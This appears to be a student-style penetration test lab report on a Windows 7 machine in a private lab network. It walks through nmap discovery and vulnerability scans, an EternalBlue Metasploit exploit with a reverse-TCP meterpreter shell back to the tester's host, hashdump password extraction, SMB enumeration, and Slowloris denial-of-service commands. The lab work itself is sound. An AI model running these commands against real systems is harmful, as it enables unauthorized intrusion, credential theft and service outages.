# Part 1: Network Vulnerability assessmeent:
## Vulnerability scanning and enumeration

### Network discovery
This is a critical phase where we shall define the methodology required to use tools for network discovering. 

#### Assets:

![Topology](topology.png)

##### Pentester:

```
ifconfig

IP:             192.168.57.10
netmask:        255.255.255.0
broadcast:      192.168.57.255
````

Then we are working under /24

Now let's discover the IPs that we have in our network:

```
sudo netdiscover -r 192.168.57.10 -i eth0
```

From which we obtain:

![netdiscovery](image.png)

and

```
sudo nmap -sn 192.168.57.10/24
```

![nmap](nmap-sn.png)



##### Victim's machine IP is `192.168.57.20`

### Targeted assess' discovery

OS detection:
```
sudo nmap -O 192.168.57.20
```

![OS detection](OS-detection.png)

from where we can see that the Target machine's OS is Windows 7, but also we have the following tcp open ports:

=======
Port        state       service
135         open        msrpc
139         open        netbios-ssn     
445         open        microsoft-dc
554         open        rtsp
2869        open        icslap
10243       open        unknown
=======


Active hosts discovery:
```
sudo nmap -sn 192.168.57.20/24 -oA host_active

sudo nmap -sn -PS22,80,443 192.168.57.20/24 -oA hosts_tcp_ping

sudo nmap -sn -PR 192.168.57.20/24 -oA hosts_arp
```
![hosts-discovery](hosts-discovery.png)


Services:
```
nmap -sV -sC -Pn -p 22,80,135,139,443,445,554,2869,3306,3389,10243 192.168.57.20 -oA service_scan
```
![service-scan](service-scan.png)


Vulnerability scripts:
```
nmap --script vuln 192.168.57.20

nmap --script vuln 192.168.57.20 -oA vulnerability_scan

nmap --script=smb-vuln* 192.168.57.20 -p 445 -oA smb_vuln_scan
```

![nmap-script-vuln](nmap-script-vuln.png)

![vulnerability-scan](vulnerability-scan.png)

![smb-vuln-scan](smb-vuln-scan.png)


```
sudo nmap -sS -sV -sC -O -p- -T4 --min-rate 1000 \
    --script="vuln and safe" \
    -oN full_audit.txt -oX full_audit.xml -oG full_audit.gnmap \
    192.168.57.20
```

![full-audit](full-audit.png)


```
python3 -c "
import xml.etree.ElementTree as ET
tree = ET.parse('full_audit.xml')
root = tree.getroot()
for host in root.findall('host'):
    ip = host.find('address').get('addr')
    print(f'Host: {ip}')
    for port in host.findall('.//port'):
        if port.find('state').get('state') == 'open':
            print(f'  Puerto {port.get("portid")}/{port.get("protocol")}')
"
```
![python-script](python-script.png)


### Controled explotation

```
# 1. Verificación adicional de MS17-010
nmap --script smb-vuln-ms17-010 -p 445 192.168.57.20 -oN ms17_verify.txt

# 2. Enumeración SMB (sin explotar)
nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 192.168.57.20

# 3. Verificar si es realmente Windows 7
nmap -sV --script smb-os-discovery 192.168.57.20 -p 445
```

Metaexploit:
```
msfconsole

# Search exploit EternalBlue
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOSTS 192.168.57.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.57.10
set LPORT 4444

exploit
```
![metaexploit](metaexploit.png)



Enumeration post-explotation:
```
# Meterpreter:
sysinfo           # Información del sistema
getuid            # Ver privilegios
hashdump          # Extraer hashes de contraseñas
ps                # Listar procesos
screenshot        # Capturar pantalla
```
![meterpreter-sysinfo](meterpreter-sysinfo.png)

![meterpreter-ps](meterpreter-ps.png)


Additional vulnerabilites scanning
```
# 1. Escanear vulnerabilidades SMB adicionales
nmap --script "smb-vuln-*" -p 445 192.168.57.20 -oN smb_all_vulns.txt

# 2. Verificar NetBIOS vulnerabilidades
nmap --script nbstat -sU -p 137 192.168.57.20

# 3. Escanear RPC (puerto 135)
nmap --script rpc-grind,msrpc-enum -p 135 192.168.57.20

# 4. Verificar servicios UPnP (puertos 2869, 5357)
nmap --script upnp-info -p 2869,5357 192.168.57.20
```

Basic forenstics from attack
```
# 1. Usar enum4linux para enumeración SMB completa
enum4linux -a 192.168.57.20 > enum4linux_results.txt

# 2. Probar conexión SMB anónima
smbclient -L //192.168.57.20 -N

# 3. Verificar si hay shares accesibles
smbmap -H 192.168.57.20+
```

DoS tests
```
# 1. Probar Slowloris (con slowhttptest)
slowhttptest -c 1000 -H -g -o slowloris_report -i 10 -r 200 -t GET -u http://192.168.57.20:5357 -x 24 -p 3

# 2. Alternativa con Perl (si slowloris.pl está disponible)
perl slowloris.pl -dns 192.168.57.20 -port 5357 -timeout 1
```

```

```

```

```

```

```

